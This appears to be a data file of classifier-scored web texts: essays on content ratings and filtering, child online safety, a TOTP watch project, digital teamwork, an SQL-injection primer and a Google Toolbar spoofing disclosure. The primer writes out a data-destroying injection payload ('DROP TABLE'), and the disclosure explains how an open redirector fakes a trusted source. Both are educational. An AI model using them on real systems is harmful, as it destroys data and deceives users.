Range,\" \"Profanity,\" \"Heterosexual Themes,\" \"Homosexual Themes,\" \"Nudity,\" \"Violence,\" \"Sex, Violence, and Profanity, \" \"Intolerance,\" \"Glorifying Drug Use,\" \"Other Adult Themes,\" and \"Gambling,\" with 9 distinctions for each category. SafeSurf and RSACi both rely on self-rating of Internet sites by web publishers. NetShepherd: Based in Calgary, Net Shepherd rates sites based on quality levels (1-5 stars). Unlike SafeSurf and RSAC, NetShepherd conducts third-party ratings of web sites. They claim to have rated over 300,000 sites. NetShepherd has also announced partnerships with firms such as Altavista and Catholic Telecom, Inc. Once these choices have been made, the browser software uses them to filter sites. When an Internet site is requested, the browser compares the site's rating with the user's selection. If the site has ratings for the chosen system and those ratings fit within the parameters chosen by the user, it is displayed as usual. If the appropriate ratings fall outside of those parameters (perhaps the site has \"frontal nudity,\" while the user was only willing to accept \"partial nudity\"), access to the site is prohibited, and the user is shown a message indicating that the site is blocked. Since most web sites are not currently rated, most software provides users with the option of blocking out sites that do not contain PICS ratings. In order to prevent mischievous children from changing ratings or disabling PICS altogether, most browsers can be configured to require a password before disabling PICS. RSACi, SafeSurf, and other proponents of ratings would obviously like everyone to rate their sites, while civil libertarians and opponents of ratings argue against any ratings. Publishers of family-oriented sites or those who are trying to reach audiences concerned with Internet content might consider rating. Similarly, purveyors of adult material might rate their sites in order to be \"good citizens\". In evaluating ratings systems, publishers may want to examine the categories used by each system and the distinctions used by those categories. Different systems will classify ratings systems in different ways, some of which may misrepresent the content of web sites. For example, sites discussing safe sex might not want to be placed in the same category with pornographic sites. Web site publishers might also consider the popularity of the ratings services. Currently (as of September 1997), there are only a few major ratings services. Publishers are free to user other ratings, but these may not be useful to the Internet users who rely upon the popular systems. This presents a dilemma for some publishers, who can either accept the ratings of the popular systems, even if those ratings misrepresent their material, or refuse to rate their sites, knowing that this might cause their sites to be unavailable to some users. Versions of Microsoft's Internet Explorer have provided an extreme example of this problem. Although IE allows user to use any PICS ratings system, RSACi is the only system that is built in to the selection list. Since Internet Explorer is the most widely-used PICS-capable browser (as of fall 1997, Netscape's Navigator does not support PICS), it seems likely that many PICS users will be relying upon RSACi. For publishers interested in reaching a wide audience, this market force may determine their choice of ratings system. Finally, philosophical concerns may cause some people to decide not to rate. Web-site publishers who are not comfortable with the general content of available ratings systems, or who object to the concept of ratings, may choose not to rate their own sites. MSNBC's troubles with ratings provide an ironic illustration of this possibility. Displeased with the RSACi ratings that would be necessary, MSNBC management removed all rating information from the site. MSNBC and other news organizations briefly discussed the possibility of creating a new ratings system specifically for news reporting. While this proposal was eventually rejected, it illustrates some of the problems with content ratings. Well-funded publishers like MSNBC might be able to effectively create ratings systems that meet their needs, but smaller publishers who want to rate their sites may be forced to accept unsatisfactory ratings. To make matters worse, third party rating does not require the consent or even notification of a web-site publisher. Since third party ratings are distributed by third party \"label bureaus,\" a web-site publisher may not know if her pages have been rated, or what the ratings said. Third-party ratings also present significant technical challenges that may discourage their development. Unlike self-ratings, third party PICS ratings do not reside on publisher's web pages. Instead, they must be distributed to users using one of two methods: Some software, such as Microsoft's Internet Explorer, provides users with the option of blocking out any site that does not have a rating. This choice may be appropriate for some, but it severely restricts the available options. By blocking out most of the Web (including possibly some sites designed for younger users), this approach presents children with a severely restricted view of the world. These issues of quality and accountability would become even trickier if numerous schemes were to come into use. If there were dozens of PICS ratings schemes to choose from, publishers would not know which to choose, and users might not know which to trust. The first - and currently the only viable alternative - is to avoid use of PICS for self-rating, and in Internet browsers. The second approach would be to develop a new ratings vocabulary, as an alternative to RSACi, SafeSurf, or other currently available ratings systems. This involves several steps: The first step is generation of a ratings system, including categories that would be discussed and distinctions within those categories. This would require a discussion of the values that will be represented in the ratings system, and how these values should be expressed. Once the system has been developed, sites must be rated. This can be done in one of two ways: Given the significant resources that will be needed to effectively deploy a new ratings system, it seems unlikely that there will be a large number of PICS alternatives available in the near future. The developers of PICS are trying to change this through the PICS Incubator project, which offers resources to organizations interested in developing new ratings systems. Book reviews and movie ratings are only two examples of the many ways in which we use information filters. Used in conjunction with other information sources - including advertising and word-of-mouth - these ratings provide a basis for making informed decisions regarding information. Unfortunately, PICS does not currently provide users with the contextual information and range of choices necessary for informed decision making. When deciding which movies to see, we have access to reviews, advertisements and trailers which provide information regarding the content. These details help us choose intelligently based on our values and preferences. On the other hand, PICS-based systems do not provide any contextual detail: users are simply told that access to a site is denied because the site's rating exceeds a certain value on the rating scale. Furthermore, the limited range of currently available PICS ratings system does not provide users with a meaningful choice between alternatives. Parents who are not comfortable with any of the current ratings systems may not find PICS to be a viable alternative. Continuing with our analogies to other media, consider book reviews in a world where only two or three publications reviewed books. This might work very well for people who agree with the opinions of these reviewers (and, of course, for the reviewers themselves!), but it would work very poorly for those who have differing viewpoints. Some might argue that the \"success\" of a single set of movie ratings offers a model for PICS. However, ratings are generally applied only to movies made for entertainment by major producers. Documentaries and educational films are generally not rated, but similar web sites could be rated under PICS. Movie ratings also provide a cautionary lesson that should be considered with respect to the Internet. Unrated movies, or movies with certain ratings, often have a difficult time reaching audiences, as they may not be shown in certain theaters or carried by large video chains. This has led to self-censorship, as directors trim explicit scenes in order to avoid NC-17 ratings. This may be appropriate for commercially-oriented entertainment, but it could be dangerous when applied to safe-sex information on the Internet. Ratings systems also fail to account for the global nature of the Internet. Legal or practical pressures aimed at convincing Internet publishers to rate their own sites will have little effect, as these businesses or individuals have the option of simply moving their material to a foreign country. Furthermore, the existing ratings systems are of limited value to those in countries that do not share western values. Concerns about unrated international material or differing cultural values could be addressed through direct censorship. For example, governments might use PICS ratings or proprietary filtering software to implement \"national firewalls\" which would screen out objectionable material. Alternatively, ratings might be used to \"punish\" inappropriate speech. If search engines chose to block sites with certain ratings (or unrated sites), or if browsers blocked certain ratings (or lack of ratings) by default, these sites might never be seen. It is possible that a wide range of PICS ratings system could come into use, providing families with a real opportunity to choose ratings that meet their values. The utility of PICS might also be increased by use of new technologies like \"metadata\" (data about data, used to describe the content of web pages and other information resources), which might be used to provide contextual information along with PICS ratings. However, these tools may not be available for general use for some time, if at all. Some people confuse ratings with the topical organization that is used in libraries and Web sites like Yahoo. While no system of organization of information is neutral, topical schemes attempt to describe what a resource is \"about\". Rating rarely helps us find information resources topically and is usually too narrowly focused on a few criteria to be useful for information retrieval. If this question is taken to mean: \"Are there any solutions that would provide children with the ability to use the Internet without ever seeing material that is explicit or \"adult,\"the answer is probably yes. This would require a combination of three factors: If the question is interpreted as meaning: \"Are there any solutions that provide some protection from adult or objectionable material without restricting free speech?\" the answer is much less clear. Stand-alone systems clearly don't meet these criteria, as they place users at the whims of software vendors, who may block sites for arbitrary reasons. In theory, PICS might fit this role, but the lack of a meaningful choice between substantially different ratings systems leaves parents and publishers with the choice of using ratings that they may not agree with, or that fail to adequately describe their needs or materials. Describing speech as \"adult\" or \"appropriate for children\" is inherently a tricky and value-laden process. In the U.S., many people have attempted to prevent schools and libraries from using everyday publications like Huckleberry Finn and descriptions of gay/lesbian lifestyles. The fierce debates over these efforts show that no consensus can be reached. Increased use of filtering software would likely be the beginning, rather than the end, of debates regarding what Internet materials are \"appropriate\" for children, and who gets to make that decision. Secondly, parents should play an active role and interest in their children's use of the Internet. For some children this might mean restricting Internet use to closely supervised sessions. Other children might be able to work with clearly defined rules and guidelines. To discourage unsupervised use of the Internet, parents might consider measures such as placing the family computer in a common space in the home and retaining adult control over any passwords required for Internet access. Parents should also work to educate children regarding proper use of the Internet. Just as parents teach children not to talk to strangers on the street, parents might discourage children from visiting certain web sites, divulging personal or family information, or participating in inappropriate chats. Some parents might consider using filtering software, despite all of the potential drawbacks. Parents considering this route should closely examine their options, in order to understand their options and the implications of any choice. For stand-alone filtering systems, this means investigating the criteria used in developing blocking lists and/or news reports describing the software. If possible, parents might try to find stand-alone systems that allow users to view and edit the lists of blocked sites. Parents considering the use of PICS systems should investigate the categories used by the various ratings systems, in order to find one that meets their needs. Information about PICS-based systems can be found at the home pages of the respective ratings systems. In general, the use of a filtering product involves an implicit acceptance of the criteria used to generate the ratings involved. Before making this decision, parents should take care to insure that the values behind the ratings are compatible with their beliefs. Finally, parents should realize that the Internet is just a reflection of society in general. Much of the \"adult\" content on the Internet can be found on cable TV, at local video stores, or in movie theaters. Since other media fail to shield children from violence or sexual content, restrictions on the Internet will always be incomplete. ISP-Based Filtering: ISPs might do the filtering themselves, preventing their customers from accessing objectionable materials, even if those customers do not have their own filtering software. This requires the use of a proxy server, which would serve as a broker between the ISP's customers and remote web sites. When a customer of a filtering ISP wants to see a web site, his request goes to the proxy server operated by the ISP. The proxy server will then check to see if the site should be blocked. If the site is allowable, the proxy server retrieves the web page and returns it to the customer. This approach is technically feasible. In fact, it's currently used by many corporations, and some ISPs that offer this service. However, proxying requires significant computational resources that may be beyond the means of smaller ISPs. Even if the ISP can afford the computers and Internet bandwidth needed, this approach is still far from ideal. In order to do the filtering, proxy servers would have to use stand-alone or PICS-based systems, so they would be subject to the limitations of these technologies (see 2.4, 2.5, and 3.13). The shortcomings of existing filtering systems may prove particularly troublesome for ISPs that advertise filtering services, as these firms could be embarrassed or worse if their filters fail to block adult material. Finally, ISPs that filter material may lose customers who are interested in unfiltered access to the Internet. Providing Filtering Software: Others have suggested that ISPs should be required to provide users with filtering software. While this might be welcome by parents who are thinking about getting on to the 'Net (and by software vendors!) it could present a financial serious burden for smaller ISPs. Most advocates of the use of blocking software by libraries have forgotten that the public library is a branch of government, and therefore subject to First Amendment rules which prohibit content-based censorship of speech. These rules apply to the acquisition or the removal of Internet content by a library. Secondly, government rules classifying speech by the acceptability of content (in libraries or elsewhere) are inherently suspect, may not be vague or overbroad, and must conform to existing legal parameters laid out by the Supreme Court. Third, a library may not delegate to a private organization, such as the publisher of blocking software, the discretion to determine what library users may see. Fourth, forcing patrons to ask a librarian to turn off blocking software has a chilling effect under the First Amendment. The PICS Incubator Project Fahrenheit 451.2: Is Cyberspace Burning? - The ACLU's Report on Filtering Software The Censorware Project The Global Internet Liberty Campaign has an excellent page on ratings and filters. The Internet Free Expression Alliance is a coalition of groups working to preserve open expression on the Internet. Computer Professionals for Social Responsibility (CPSR)",
        "prob": "tensor([[0.0296, 0.9704]])"
    },
    {
        "text": "Caught in the Web: Keeping Your Kids Safe Online The world wide web can be a wide world of sites that you don't want your child or teen stumbling into. Read our guide for navigating internet safety. Be Open. Put computers in a high traffic area. Your son/daughter will be less likely to access or post inappropriate content if they know you can see the screen. Consider not allowing your teen to have a data plan on their cell phone. Also, openly communicate with your child. Make sure you know what their interests are and talk to them about what they like to do when they're on the internet. . Tell your child they can only join Facebook if you have an account, too. Make Clear Rules. Let your child know how long they can stay on the computer, what types of sites they can visit, what software they can use, etc. Install Security Tools. Keep your anti-virus software up-to-date and check your browser's security settings. Not sure what those settings should be? Check out StaySafeOnline.org. Here are some other ways to keep your computer safe and secure: - Check With Your Internet Service Provider. They may offer special services or programs designed to keep your kids safe online. - Install Special Software. There are a variety of tools available that meet a variety of needs. Check out InternetSafety.com for several, family-friendly options that you can customize for your needs. Adapted from the Department of Homeland Security's guidelines. Related Articles: Safety",
        "prob": "tensor([[0.0147, 0.9853]])"
    },
    {
        "text": "No secret to stopping XSS and SQL injection attacks Read, test, communicate, repeat SQL injection attacks and cross-site scripting exploits just won't die. The most recent and high-profile incident was a mass webpage attack on more than 100,000 pages, which included victims as diverse as The Wall Street Journal, TomTom, and the UK's Strathclyde police. But none of it would have been possible if the sites involved had been more resilient to SQL injection attacks. This signals a lack of awareness among developers — but we shouldn't just be pointing the finger at them. The problem also comes back to a lack of awareness among testers, who really should be actively testing applications for common security holes as a matter of course. But the problem goes even deeper than that. The current emphasis on unit testing among developers has produced a myopic attitude to testing, in which integration testing — which would help to expose certain security flaws — is seen as too troublesome to bother with. The frustrating thing about SQL injection attacks in particular, though, is that they're so easy to prevent in the first place — and easy to test for, of course. Take the following query. Let's say we run a travel website where somebody searches for hotels in Blackpool. The query, constructed in your server code, would look something like: SELECT * FROM hotels WHERE city = 'Blackpool'; In the search form, the user would enter a town/city. The server component extracts this value from the submitted form, and places it directly into the query. Giving effectively free access to the database opens up all sorts of potential for sneaky shenanigans from unscrupulous exploiters. All the user has to do is add their own closing single-quote in the search form, plus some additional gubbins to turn it into a valid query: Everything after the -- is treated as a comment, so the door to your data is now wide open. How about if the user types into the search form: Blackpool'; DROP TABLE hotels; -- Your server-side code will faithfully construct this into the following SQL, and pass it straight to the database, which in turn will chug away without question, just following orders: SELECT * FROM hotels WHERE city = 'Blackpool'; DROP TABLE hotels; --'; Depending how malicious the attacker is, they could wreak all sorts of havoc or (worse, in a way) build on the \"base exploit\" to extract other users' passwords from the database. There's a good list of SQL injection examples here. Next page: Sanitized for your protection",
        "prob": "tensor([[2.0406e-06, 1.0000e+00]])"
    },
    {
        "text": "Google Toolbar allows spoofing the information presented in the dialog which is being displayed when adding a new Google Toolbar button. This can allow an attacker to convince the users that his button comes from a trusted domain. This button can then be used to download malicious files or conduct phishing attacks (e.g. show a login form of a bank). - Google Toolbar 5 beta for Internet Explorer - Google Toolbar 4 for Internet Explorer - Google Toolbar 4 for Firefox (partially) Google Toolbar provides a nice API for creating toolbar buttons. Basically, the button information is stored in an XML file. In order to add a button, the toolbar user must click on a specially crafted link which refers to the button's XML file. When the user click on the link, a dialog appears with all the following details: The domain where the button is being downloaded from, the name, description and icon of the button and some \"privacy considerations\", which basically shows the domains which the button interacts with (sends/receive information). By creating a specially crafted URLs it is possible for an attacker to fake the domains displayed in the \"Downloaded from\" and \"Privacy considerations\" sections. This specially crafted URL can be created by simply adding an open redirector (e.g. in google.com - http://www.google.com/local_url?q=) before the URL. An attacker can use this vulnerability to gain the victim's trust to add and use the button, and by that the victim will trust the files that the button offer, or enter private information. In the new beta version of the toolbar it is also possible to alert the user every few seconds to click on the button. In the Firefox version of Google Toolbar it is only possible to fake the \"Privacy considerations\" section. A proof-of-concept which adds a \"critical update\" button can be found here. Use it at your own risk, though it shouldn't do anything but suggest you to download gupdate.exe from my site, which is basically the windows calculator. Workaround / Suggestion Google have acknowledged this and are already working on a fix. Until a fixed version is provided, I suggest to avoid adding new buttons to the toolbar.",
        "prob": "tensor([[2.0459e-06, 1.0000e+00]])"
    },
    {
        "text": "With almost a billion friends on Facebook, six billion cell phone accounts globally, and twenty billion \"things\" from refrigerators to bridge spans to micro-medical devices soon to be wired by Internet, the digital age is upon us in full force. Everyone and everything is connected or soon will be by social media, on mobile platforms, and in the cloud. That puts vast new arrays of assets in play, from crowds to drones, sensors to shoppers. If teams can leverage those assets, hard and soft, digital and real-world, mass them quickly or marshal them with precision accuracy, teams can gain advantage as never before. The recent Kony2012 viral video offers proof that something special is happening as a result of all this connectedness: digital collaboration has come of age. Garnering 100 million YouTube views in six days the fastest ever to reach that mark Kony2012 demonstrated that digital collaboration can create astounding effects not possible just five years ago. Achieving those effects is no accident. While much is made of \"emergent collaboration,\" Kony2012 went viral by design. The Invisible Children, Inc. team that masterminded the campaign comprised veteran media activists and fundraisers pursuing a common enough goal (a criminal's arrest), but using skills and means unique to the digital age: a viral message, built on a 30-minute video, self-replicating among millions of real-world and online partisans across networks. Emergent, yes. But no less planned or executed than another viral blockbuster the OMGPOP team's March 2012 breakout of Draw Something, a Pictionary-like game. Three weeks after launch, gamers, Facebook friends and Twitter followers had downloaded the Draw Something app 35 million times, created over one billion pictures and were creating three thousand drawings per second. Close interplay between social and mobile platforms accelerated the effect. Collaboration between OMGPOP and Couchbase, its database partner, assured it. Teams scaled the cloud implementation to handle the massive load without downtime. The result: by late March 2012, Draw Something had 15 million daily players and was the Apple AppStore's #1 word game in 84 countries. Viral-by-design is a unique effect of digital collaboration. The Invisible Children and the OMGPOP teams each achieved it. Can you? Don't stop at viral-by-design. Today, teams can achieve seven further effects unique to collaboration in the digital age. They are the fuel in the engine of the networked world. Each can confer decisive advantage in the marketplace or the school room, the battlespace or the political race. Each is the new work of teams today. 1. Precision Identity. In the digital world, where you are defines who you are. Everyone has a unique geospatial identity: you and only you were over \"there\" a minute ago and over \"here\" now. Competitors know your customers by the stores they visit payday Fridays and grab their attention and wallet on Thursdays. Strike teams know insurgents by the mud huts they visit, then find and disassemble terrorist networks faster. Precision identity is a capability. Do you have it? 2. Mass Customization. From Nikes to K-12 curricula, drone strikes to personalized medicines, teams can mass produce unique solutions for anyone. The truly disruptive move in K-12 education, for example, will be personalized curricula uniquely customized student-by-student. Love skateboards? Here's the physics of staying on your deck jumping a 360-degree ollie while riding fakie. Yes, you can download an app for that! 3. Common Operating Pictures. Dozens of systems and networks tell some of the stories about your firm. None tell the whole story. Now you can line them all up, from social media, consumer insights, competitive intelligence, marketplace measurement, sales, and distribution. Share a total view of performance at a single point in time with partners and colleagues so everyone is on the same page. You won't be the first to get this view. Don't be the last. 4. Rapid Innovation/Move-to-Market Cycles. \"Collaboration with customers slows me down.\" Wrong: collaboration with customers speeds your move to market. You avoid rework and get value in the hands of users fast. Just ask Steve Ellis, EVP at Wells Fargo, whose team took Wells's wholesale services online in a year. \"Fastest uptake I ever saw,\" he said. The result: spectacular growth in transactions, from $1 trillion to $11 trillion over a decade. 5. Crowd-Sourced Creation. Whether online (think: Wikipedia) or on the fly (think: Twitter), in design (think: Local Motors' Rally Fighter car) or in finance (think: Kickstarter), millions contributing a little make crowds smarter, richer and happier, faster. Love the crowd; it will love you right back. 6. Real-Time Situational Awareness. What's going on in the factory across the globe, on the store-shelf across town, or with that crowd straight ahead? You can achieve 360/real-time awareness of your situation now, from remote sensing to location awareness. By the way you already feature in someone else's 360 \"SA\". But you knew that! 7. Predicting the Future Faster, Sooner. \"Big data\" analytics with real-world guides let you see big-picture patterns and micro-trends with astonishing precision, in time to seize the day or head off disaster. That knack market leaders have for knowing what will happen next, and when? That's by design. Transforming effects to results requires strategy, management, and even more collaboration. Barack Obama is President of the United States today because David Plouffe stitched together Obama2008's team of campaign veterans, e-commerce pros, and social media experts. That team achieved all eight digital-age effects, supercharged partisans for age-old purposes raise money, knock on doors, and get out the vote and gained victory on November 4, 2008. \"The big difference this year is not the technology,\" Joe Rospars, the campaign's social media chief said. \"It's the coordination.\" Effects alone never guarantee results. Despite Kony2012, Joseph Kony remains free. But make no mistake. There's plenty of room on history's ash heap for those who assume this all happens by chance. For teams that can attain these effects by capability by design watch out, world. This post is part of the HBR Insight Center on The Secrets of Great Teams.",
        "prob": "tensor([[0.1842, 0.8158]])"
    },
    {
        "text": "Passwords establish the identity of a user, and they are an essential component of modern information technology. In this article, I describe one-time passwords: passwords that you use once and then never again. Because they’re used only once, you don’t have to remember them. I describe how to implement one-time passwords with a Texas Instruments (TI) eZ430-Chronos wireless development tool in a watch and how to use them to log in to existing web services such as Google Gmail (see Photo 1). Photo 1—The Texas Instruments eZ430 Chronos watch displays a unique code that enables logging into Google Gmail. The code is derived from the current time and a secret value embedded in the watch. To help me get around on the Internet, I use a list of about 80 passwords (at the latest count). Almost any online service I use requires a password: reading e-mail, banking, shopping, checking reservations, and so on. Many of these Internet-based services have Draconian password rules. For example, some sites require a password of at least eight characters with at least two capitals or numbers and two punctuation characters. The sheer number of passwords, and their complexity, makes it impossible to remember all of them. What are the alternatives? There are three different ways of verifying the identity of a remote user. The most prevailing one, the password, tests something that a user knows. A second method tests something that the user has, such as a secure token. Finally, we can make use of biometrics, testing a unique user property, such as a fingerprint or an eye iris pattern. Each of these three methods comes with advantages and disadvantages. The first method (passwords) is inexpensive, but it relies on the user’s memory. The second method (secure token) replaces the password with a small amount of embedded hardware. To help the user to log on, the token provides a unique code. Since it’s possible for a secure token to get lost, it must be possible to revoke the token. The third method (biometrics) requires the user to enroll a biometric, such as a fingerprint. Upon login, the user’s fingerprint is measured again and tested against the enrolled fingerprint. The enrollment has potential privacy issues. And, unlike a secure token, it’s not possible to revoke something that is biometric. The one-time password design in this article belongs to the second category. A compelling motivation for this choice is that a standard, open proposal for one-time passwords is available. The Initiative for Open Authentication (OATH) is an industry consortium that works on a universal authentication mechanism for Internet users. They have developed several proposals for user authentication methods, and they have submitted these to the Internet Engineering Task Force (IETF). I’ll be relying on these proposals to demonstrate one-time passwords using a eZ430-Chronos watch. The eZ430-Chronos watch, which I’ll be using as a secure token, is a wearable embedded development platform with a 16-bit Texas Instruments MSP430 microcontroller. ONE-TIME PASSWORD LOGON Figure 1 demonstrates how one-time passwords work. Let’s assume a user—let’s call him Frank—is about to log on to a server. Frank will generate a one-time password using two pieces of information: a secret value unique to Frank and a counter value that increments after each authentication. The secret, as well as the counter, is stored in a secure token. To transform the counter and the secret into a one-time password, a cryptographic hash algorithm is used. Meanwhile, the server will generate the one-time password it is expecting to see from Frank. The server has a user table that keeps track of Frank’s secret and his counter value. When both the server and Frank obtain the same output, the server will authenticate Frank. Because Frank will use each password only once, it’s not a problem if an attacker intercepts the communication between Frank and the server. Figure 1—A one-time password is formed by passing the value of a personal secret and a counter through a cryptographic hash (1). The server obtains Frank’s secret and counter value from a user table and generates the same one-time password (2). The two passwords must match to authenticate Frank (3). After each authentication, Frank’s counter is incremented, ensuring a different password the next time (4). After each logon attempt, Frank will update his copy of the counter in the secure token. The server, however, will only update Frank’s counter in the user table when the logon was successful. This will intercept false logon attempts. Of course, it is possible that Frank’s counter value in the secure token gets out of sync with Frank’s counter value in the server. To adjust for that possibility, the server will use a synchronization algorithm. The server will attempt a window of counter values before rejecting Frank’s logon. The window chosen should be small (i.e., five). It should only cover for the occasional failed logon performed by Frank. As an alternate mechanism to counter synchronization, Frank could also send the value of his counter directly to the server. This is safe because of the properties of a cryptographic hash: the secret value cannot be computed from the one-time password, even if one knows the counter value. You see that, similar to the classic password, the one-time password scheme still relies on a shared secret between Frank and the server. However, the shared secret is not communicated directly from the user to the server, it is only tested indirectly through the use of a cryptographic hash. The security of a one-time password therefore stands or falls with the security of the cryptographic hash, so it’s worthwhile to look further into this operation. A cryptographic hash is a one-way function that calculates a fixed-length output, called the digest, from an arbitrary-length input, called the message. The one-way property means that, given the message, it’s easy to calculate the digest. But, given the digest, one cannot find back the message. The one-way property of a good cryptographic hash implies that no information is leaked from the message into the digest. For example, a small change in the input message may cause a large and seemingly random change in the digest. For the one-time password system, this property is important. It ensures that each one-time password will look very different from one authentication to the next. The one-time password algorithm makes use of the SHA-1 cryptographic hash algorithm. This algorithm produces a digest of 160 bits. By today’s Internet standards, SHA-1 is considered old. It was developed by Ronald L. Rivest and published as a standard in 1995. Is SHA-1 still adequate to create one-time passwords? Let’s consider the problem that an attacker must solve to break the one-time password system. Assume an attacker knows the SHA-1 digest of Frank’s last logon attempt. The attacker could now try to find a message that matches the observed digest. Indeed, knowing the message implies knowing a value of Frank’s secret and the counter. Such an attack is called a pre-image attack. Fortunately, for SHA-1, there are no known (published) pre-image attacks that are more efficient than brute force trying all possible messages. It’s easy to see that this requires an astronomical number of messages values. For a 160-bit digest, the attacker can expect to test on the order of 2160 messages. Therefore it’s reasonable to conclude that SHA-1 is adequate for the one-time password algorithm. Note, however, that this does not imply that SHA-1 is adequate for any application. In another attack model, cryptographers worry about collisions, the possibility of an attacker finding a pair of messages that generate the same digest. For such attacks on SHA-1, significant progress has been made in recent years. The one-time password scheme in Figure 1 combines two inputs into a single digest: a secret key and a counter value. To combine a static, secret key with a variable message, cryptographers use a keyed hash. The digest of a keyed hash is called a message authentication code (MAC). It can be used to verify the identity of the message sender. Figure 2 shows how SHA-1 is used in a hash-based message authentication code (HMAC) construction. SHA-1 is applied twice. The first SHA-1 input is a combination of the secret key and the input message. The resulting digest is combined again with the secret key, and SHA-1 is then used to compute the final MAC. Each time, the secret key is mapped into a block of 512 bits. The first time, it is XORed with a constant array of 64 copies of the value 0×36. The second time, it is XORed with a constant array of 64 copies of the value 0x5C. Figure 2—The SHA-1 algorithm on the left is a one-way function that transforms an arbitrary-length message into a 160-bit fixed digest. The Hash-based message authentication code (HMAC) on the right uses SHA-1 to combine a secret value with an arbitrary-length message to produce a 160-bit message authentication code (MAC). THE HOTP ALGORITHM With the HMAC construction, the one-time password algorithm can now be implemented. In fact, the HMAC can almost be used as is. The problem with using the MAC itself as the one-time password is that it contains too many bits. The secure token used by Frank does not directly communicate with the server. Rather, it shows a one-time password Frank needs to type in. A 160-bit number requires 48 decimal digits, which is far too long for a human. OATH has proposed the Hash-based one-time password (HOTP) algorithm. HOTP uses a key (K) and a counter (C). The output of HOTP is a six-digit, one-time password called the HOTP value. It is obtained as follows. First, compute a 160-bit HMAC value using K and C. Store this result in an array of 20 bytes, hmac, such that hmac contains the 8 leftmost bits of the 160-bit HMAC string and hmac contains the 8 rightmost bits. The HOTP value is then computed with a snippet of C code (see Listing 1). Listing 1—C code used to compute the HTOP value There is now an algorithm that will compute a six-digit code starting from a K value and a C value. HOTP is described in IETF RFC 4226. A typical HOTP implementation would use a 32-bit C and an 80-bit K. An interesting variant of HOTP, which I will be using in my implementation, is the time-based one-time password (TOTP) algorithm. The TOTP value is computed in the same way as the HOTP value. However, the C is replaced with a timestamp value. Rather than synchronizing a C between the secure token and the server, TOTP simply relies on the time, which is the same for the server and the token. Of course, this requires the secure token to have access to a stable and synchronized time source, but for a watch, this is a requirement that is easily met. The timestamp value chosen for TOTP is the current Unix time, divided by a factor d. The current Unix time is the number of seconds that have elapsed since midnight January 1, 1970, Coordinated Universal Time. The factor d compensates for small synchronization differences between the server and the token. For example, a value of 30 will enable a 30-s window for each one-time password. The 30-s window also gives a user sufficient time to type in the one-time password before it expires. IMPLEMENTATION IN THE eZ430-CHRONOS WATCH I implemented the TOTP algorithm on the eZ430-Chronos watch. This watch contains a CC430F6137 microcontroller, which has 32 KB of flash memory for programs and 4,096 bytes of RAM for data. The watch comes with a set of software applications to demonstrate its capabilities. Software for the watch can be written in C using TI’s Code Composer Studio (CCStudio) or in IAR Systems’s IAR Embedded Workbench. The software for the eZ430-Chronos watch is structured as an event-driven system that ties activities performed by software to events such as alarms and button presses. In addition, the overall operation of the watch is driven through several modes, corresponding to a particular function executed on the watch. These modes are driven through a menu system. Photo 2 shows the watch with its 96-segment liquid crystal display (LCD) and four buttons to control its operation. The left buttons select the mode. The watch has two independent menu systems, one to control the top line of the display and one to control the bottom line. Hence, the overall mode of the watch is determined by a combination of a menu-1 entry and a menu-2 entry. Photo 2—With the watch in TOTP mode, one-time passwords are shown on the second line of the display. In this photo, I am using the one-time password 854410. The watch display cycles through the strings “totP,” “854,” and “410.” Listing 2 illustrates the code relevant to the TOTP implementation. When the watch is in TOTP mode, the sx button is tied to the function set_totp(). This function initializes the TOTP timestamp value. Listing 2—Code relevant to the TOTP implementation The function retrieves the current time from the watch and converts it into elapsed seconds using the standard library function mktime. Two adjustments are made to the output of mktime, on line 11 and line 12. The first factor, 2208988800, takes into account that the mktime in the TI library returns the number of seconds since January 1, 1900, while the TOTP standard sets zero time at January 1, 1970. The second factor, 18000, takes into account that my watch is set to Eastern Standard Time (EST), while the TOTP standard assumes the UTC time zone—five hours ahead of EST. Finally, on line 14, the number of seconds is divided by 30 to obtain the standard TOTP timestamp. The TOTP timestamp is further updated every 30 s, through the function tick_totp(). The one-time password is calculated by compute_totp on line 33. Rather than writing a SHA1-HMAC from scratch, I ported the open-source implementation from Google Authenticator to the TI MSP 430. Lines 39 through 50 show how a six-digit TOTP code is calculated from the 160-bit digest output of the SHA1-HMAC. The display menu function is display_totp on line 52. The function is called when the watch first enters TOTP mode and every second after that. First, the watch will recompute the one-time password code at the start of each 30-s interval. Next, the TOTP code is displayed. The six digits of the TOTP code are more than can be shown on the bottom line of the watch. Therefore, the watch will cycle between showing “totP,” the first three digits of the one-time password, and the next three digits of the one-time password. The transitions each take 1 s, which is sufficient for a user to read all digits. There is one element missing to display TOTP codes: I did not explain how the unique secret value is loaded into the watch. I use Google Authenticator to generate this secret value and to maintain a copy of it on Google’s servers so that I can use it to log on with TOTP. LOGGING ONTO GMAIL Google Authenticator is an implementation of TOTP developed by Google. It provides an implementation for Android, Blackberry, and IOS so you can use a smartphone as a secure token. In addition, it also enables you to extend your login procedure with a one-time password. You cannot replace your standard password with a one-time password, but you can enable both at the same time. Such a solution is called a two-factor authentication procedure. You need to provide a password and a one-time password to complete the login. As part of setting up the two-factor authentication with Google (through Account Settings – Using Two-Step Verification), you will receive a secret key. The secret key is presented as a 16-character string made up of a 32-character alphabet. The alphabet consists of the letters A through Z and the digits 2, 3, 4, 5, 6, and 7. This clever choice avoids numbers that can confused with letters (8 and B, for example). The 16-character string thus represents an 80-bit key. I program this string in the TOTP design for the eZ430-Chronos watch to initialize the secret. In the current implementation, the key is loaded in the function reset_totp(). base32_decode((const u8 *) ”4RGXVQI7YVY4LBPC”, stotp.key, 16); Of course, entering the key as a constant string in the firmware is an obvious vulnerability. An attacker who has access to a copy of the firmware also has the secret key used by the TOTP implementation! It’s possible to protect or obfuscate the key from the watch firmware, but these techniques are beyond the scope of this article. Once the key is programmed into the watch and the time is correctly set, you can display TOTP codes that help you complete the logon process of Google. Photo 1 shows a demonstration of logging onto Google’s two-step verification with a one-time password. OTHER USES OF TOTP There are other possibilities for one-time passwords. If you are using Linux as your host PC, you can install the OATH Toolkit, which implements the HOTP and TOTP mechanisms for logon. This toolkit enables you to install authentication modules on your PC that can replace the normal login passwords. This enables you to effectively replace the password you need to remember with a password generated from your watch. Incidentally, several recent articles—which I have included in the resources section of this article—point to the limits of conventional passwords. New technologies, including one-time passwords and biometrics, provide an interesting alternative. With standards such as those from OATH around the corner, the future may become more secure and user-friendly at the same time. [Editor's note: This article originally appeared in Circuit Cellar 262, May 2012.] Patrick Schaumont writes the Embedded Security column for Circuit Cellar magazine. He is an Associate Professor in the Bradley Department of Electrical and Computer Engineering at Virginia Tech. Patrick works with his students on research projects in embedded security, covering hardware, firmware, and software. To download the code, go to 